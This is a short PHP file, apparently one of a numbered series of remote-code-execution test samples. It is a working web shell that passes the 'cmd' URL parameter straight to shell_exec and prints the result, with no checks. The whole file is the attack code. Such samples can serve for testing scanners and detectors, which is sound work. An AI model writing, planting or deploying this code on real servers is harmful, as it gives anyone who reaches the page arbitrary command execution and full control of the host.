<?php
// RCE test variation #1318
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>